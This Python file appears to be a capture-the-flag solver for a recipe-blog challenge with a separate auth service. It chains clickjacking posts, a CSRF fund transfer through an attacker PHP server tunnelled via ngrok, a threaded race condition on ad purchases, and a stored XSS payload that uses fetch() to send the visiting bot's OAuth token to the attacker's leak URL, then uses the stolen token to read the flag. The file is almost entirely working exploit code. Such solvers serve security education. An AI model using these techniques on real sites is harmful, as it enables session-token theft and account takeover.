import requests
import urllib.parse
import random
import string
import re
from threading import Thread
import subprocess
import json
import os


BLOG_HOST = os.environ.get("BLOG", 'http://saffron.challs.teamitaly.eu')
AUTH_HOST = os.environ.get("URL", "http://uauth.challs.teamitaly.eu")

LEAK_URL = None  # 'http://localhost:8000/?leak='
ATTACK_URL = None  # 'http://localhost:8000/start.php'
NGROK_URL = None

ATTACKER_SERVER_DIRECTORY = os.path.join(
    os.path.dirname(os.path.abspath(__file__)), 'attacker_server')


def generate_random_string(n=10):
    return ''.join(random.choices(string.ascii_letters, k=n))


def generate_random_user(role):
    return {
        'username': generate_random_string(),
        'password': generate_random_string(),
        'role': role
    }


def register(user):
    r = requests.post(AUTH_HOST + '/register?redirect_uri=' + urllib.parse.quote(BLOG_HOST + '/registered'), data={
        'username': user['username'],
        'password': user['password'],
        'role': user['role']
    })
    assert (r.status_code == 200)


def login(user):
    r = requests.post(AUTH_HOST + '/auth?redirect_uri=' + urllib.parse.quote(BLOG_HOST + '/cb') + '&response_type=token', data={
        'username': user['username'],
        'password': user['password']
    })
    assert (r.status_code == 200)
    m = re.search(r'token=(.+)&exp', r.url)
    assert (m)
    user['token'] = m[1]
    return m[1]


def new_post(user, content):
    r = requests.post(BLOG_HOST + '/new', data={
        'title': generate_random_string(),
        'content': content
    },
        cookies={
        'token': user['token']
    })

    assert (r.status_code == 200)

    return r.url.split('/')[-1]


def get_user_balance(user):
    r = requests.get(BLOG_HOST + '/me', cookies={
        'token': user['token']
    })
    m = re.search(
        r'Username: (.+)\s+<br />\s+Role: (.+)\s+<br />\s+Balance: (\d+)', r.text)
    assert (m)
    return int(m[3])


def ad_is_free(user, recipeid, content):
    r = requests.post(BLOG_HOST + '/buyad', data={
        'ad': content,
        'recipeid': recipeid
    },
        cookies={
        'token': user['token']
    })

    if ('ad already taken' in r.text):
        return False

    return True


def buy_ad_race_condition(user, recipeid, content):
    r = requests.post(BLOG_HOST + '/buyad', data={
        'ad': content,
        'recipeid': recipeid
    },
        cookies={
        'token': user['token']
    })

    if ('you need to be an advertiser to buy an ad' in r.text
            or 'not enough money' in r.text):
        print('.', end='')
        return

    if ('ad already taken' in r.text
       or 'UNIQUE constraint failed' in r.text):
        print('V', end='')
        return

    print('?', end='')


# start the web server
with subprocess.Popen(['php', '-S', 'localhost:8000'], cwd=ATTACKER_SERVER_DIRECTORY) as web_server_process:
    with subprocess.Popen(['ngrok', 'http', '8000', '--log', 'stdout', '--log-format', 'json'], stdout=subprocess.PIPE) as ngrok_process:

        # get the ngrok url
        while (True):
            log = json.loads(ngrok_process.stdout.readline())
            print(log)

            if (log['msg'] == 'started tunnel'):
                NGROK_URL = log['url']
                ATTACK_URL = NGROK_URL + '/start.php'
                LEAK_URL = NGROK_URL + '/?leak='
                break

        print('\n\n', NGROK_URL, '\n\n')

        # generate the users
        author = generate_random_user('author')
        register(author)
        login(author)

        advertiser = generate_random_user('advertiser')
        register(advertiser)
        login(advertiser)

        # create a redirect and a dummy recipe to exploit the race condition
        post_payload = f'''
        <a href="{ATTACK_URL}" style="background-color: red; width:300px; height:100px; position: absolute; right: 0px; top: 0px;"></a>
        '''
        recipeid_clickjacking_1 = new_post(author, post_payload)
        recipeid_get_money = new_post(author, 'ciao')

        # print(author)
        # print(advertiser)

        print(
            f'\n\nSetting the csrf server to buy the ad of post: {recipeid_get_money}')

        with open(ATTACKER_SERVER_DIRECTORY + '/csrf_recipe_id.txt', 'w') as file:
            file.write(recipeid_get_money)

        print(
            f'Making the bot visit the post with recipeid: {recipeid_clickjacking_1}')

        r = requests.post(BLOG_HOST + '/report',
                          data={'recipeid': recipeid_clickjacking_1})
        print(r)
        # input('\nEnter to continue...')

        # check if the csrf attack worked (free money on the author account)
        balance = get_user_balance(author)
        print(f'\nBalance: {balance}\n')
        assert (balance >= 100)

        # create a dummy post that starts with "cb"
        while (True):
            print('.', end='', flush=True)
            recipeid_attack = new_post(author, 'ciao')
            if (recipeid_attack[:2] == 'cb'):
                break

        # exploit the race condition to buy the ad with the author money

        payload_ad = f"<script>fetch('{LEAK_URL}' + encodeURIComponent(document.baseURI))</script>"

        threads = []
        for _ in range(20):
            t = Thread(target=buy_ad_race_condition,
                       args=(author, recipeid_attack, payload_ad))
            threads.append(t)
            t.start()

            t = Thread(target=buy_ad_race_condition, args=(
                advertiser, recipeid_attack, payload_ad))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        # create the redirect post to make the bot visit the recipe with our ad as authorization callback
        post_payload = f'''
        <a href="{AUTH_HOST}/auth?redirect_uri=http%3A%2F%2Fsaffron.challs.teamitaly.eu%2F{recipeid_attack}&response_type=token" style="background-color: red; width:300px; height:100px; position: absolute; right: 0px; top: 0px;"></a>
        '''
        recipeid_clickjacking_2 = new_post(author, post_payload)

        print('\n\nExploit post id is: ' + recipeid_attack)
        print('Making the bot visit the post ' +
              recipeid_clickjacking_2 + ' to leak the token')

        r = requests.post(BLOG_HOST + '/report',
                          data={'recipeid': recipeid_clickjacking_2})
        print(r)

        # read the leaked token and use it to get the flag
        leak = open(ATTACKER_SERVER_DIRECTORY + '/leak.txt').read()
        m = re.search('#token=(.+)&', leak)

        token = m[1]
        print(token)

        r = requests.get(BLOG_HOST + '/private', cookies={'token': token})
        m = re.search(r'<a href="(.+)">Flag</a>', r.text)

        r = requests.get(BLOG_HOST + m[1])
        m = re.search(r'flag\{.+\}', r.text)

        flag = m[0]
        print('\n', flag)

        ngrok_process.kill()
        web_server_process.kill()
